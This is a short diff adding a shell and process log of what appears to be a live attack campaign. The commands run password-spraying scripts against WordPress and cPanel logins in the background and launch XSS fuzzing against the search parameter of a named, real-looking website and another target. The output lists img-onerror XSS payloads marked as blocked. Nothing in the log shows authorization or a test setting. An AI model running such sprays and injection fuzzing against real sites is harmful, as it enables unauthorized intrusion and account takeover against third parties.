@@ -1,0 +1,7 @@
+8326 ->  p2s/wp_spray.py
+12849 /bin/bash -c cd /home/runner && setsid nohup ->  p2s/filter_fuzz.py "https://mediaaksara.id/?s=%s" 5 > p2s/fuzz_ma.log 2>&1 < /dev/null & sleep 40; echo "--- cPanel spray (mati/blok?) ---"; pgrep -cf "[c]p_spray.py"; tail -4 p2s/cp_spray.log; echo "--- wp spray ---"; tail -3 p2s/wp_spray.log; echo "--- fuzz mulai ---"; cat p2s/fuzz_ma.log
+12851 ->  p2s/filter_fuzz.py https://mediaaksara.id/?s=%s 5
+14270 /bin/bash -c cd /home/runner && setsid nohup bash -c 'python3 p2s/xss.py cigombong 12 > p2s/xss_ci.log 2>&1; sleep 20; ->  p2s/cp_spray.py > p2s/cp_spray.log 2>&1' > /dev/null 2>&1 < /dev/null & sleep 20; pgrep -af "[p]ython3 p2s" | sed 's/ python3/ -> /' | head -4; tail -3 p2s/fuzz_ma.log
+  [000] "><img src=x onerror=alert(1)>         MATI/BLOK
+  [000] '><img src=x onerror=alert(1)>         MATI/BLOK
+  [000] </title><img src=x onerror=alert(1)>   MATI/BLOK
